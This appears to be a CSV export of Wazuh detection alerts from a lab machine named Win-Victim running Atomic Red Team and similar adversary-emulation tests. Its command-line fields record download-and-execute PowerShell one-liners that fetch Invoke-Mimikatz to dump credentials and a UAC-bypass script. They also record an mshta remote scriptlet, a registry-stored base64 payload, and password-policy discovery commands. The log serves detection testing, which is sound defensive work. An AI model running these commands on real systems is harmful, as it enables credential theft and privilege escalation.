timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 09:40:02.289",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"\""C:\\WINDOWS\\system32\\reg.exe\"" add HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam /v ART /t REG_SZ /d U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI= /f",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:58.131",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {# Encoded payload in next command is the following \\\""\""Set-Content -path \\\""\""$env:SystemRoot/Temp/art-marker.txt\\\""\"" -value \\\""\""Hello from the Atomic Red Team\\\""\""\\\""\"" reg.exe add \\\""\""HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\\\""\"" /v ART /t REG_SZ /d \\\""\""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\""\"" /f iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:56.796",Win-Victim,Suspicious Windows cmd shell execution,3,92032,mshta.exe  javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close(),C:\\Windows\\System32\\mshta.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:56.793",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\Windows\\system32\\cmd.exe  /c \""mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:56.790",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"\""cmd.exe\"" /c C:\\Windows\\system32\\cmd.exe /c \""mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:56.787",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -exec bypass -noprofile \""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:52.905",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c powershell.exe -exec bypass -noprofile \""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:47.786",Win-Victim,Sysmon - Suspicious Process - explorer.exe,12,61640,"C:\\WINDOWS\\explorer.exe /factory,{5BD95610-9434-43C2-886C-57852CC8A120} -Embedding",C:\\Windows\\explorer.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:47.674",Win-Victim,Windows backup and restore tool sdclt.exe launched via C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe with High integrity level,3,92061,"\""C:\\WINDOWS\\system32\\sdclt.exe\""",C:\\Windows\\System32\\sdclt.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:39:44.175",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"\""cmd.exe\"" /c Powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:37:20.831",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c powershell.exe \""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:20:01.435",Win-Victim,Discovery activity executed,3,92031,C:\\WINDOWS\\system32\\net1 user,C:\\Windows\\SysWOW64\\net1.exe,C:\\Windows\\SysWOW64\\net.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:20:01.418",Win-Victim,Discovery activity executed,3,92031,net user,C:\\Windows\\SysWOW64\\net.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:20:01.403",Win-Victim,Discovery activity executed,3,92031,C:\\WINDOWS\\system32\\net1 user,C:\\Windows\\SysWOW64\\net1.exe,C:\\Windows\\SysWOW64\\net.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:20:01.387",Win-Victim,Discovery activity executed,3,92031,net user,C:\\Windows\\SysWOW64\\net.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:54.849",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:53.639",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""ResetLockoutCount\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:53.637",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:52.294",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""LockoutBadCount\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:50.589",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:49.544",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""LockoutDuration\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:44.099",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:41.364",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MinimumPasswordLength\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:39.588",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:35.469",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MinimumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:32.683",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:13.998",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MaximumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:12.620",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:08.910",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MaximumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:06.829",Win-Victim,C:\\Windows\\SysWOW64\\SecEdit.exe binary in a suspicious location launched by C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,4,92066,"\""C:\\WINDOWS\\system32\\SecEdit.exe\"" /export /cfg C:\\WINDOWS\\TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\SecEdit.exe,C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:19:01.067",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""PasswordHistorySize\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
